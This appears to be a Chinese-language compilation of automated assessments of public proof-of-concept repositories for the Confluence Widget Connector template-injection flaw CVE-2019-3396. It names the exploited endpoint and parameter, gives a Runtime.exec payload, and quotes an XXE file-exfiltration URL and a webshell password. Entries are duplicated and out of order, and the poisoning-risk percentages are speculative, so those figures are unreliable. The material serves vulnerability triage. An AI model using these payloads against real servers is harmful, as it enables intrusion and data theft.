**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

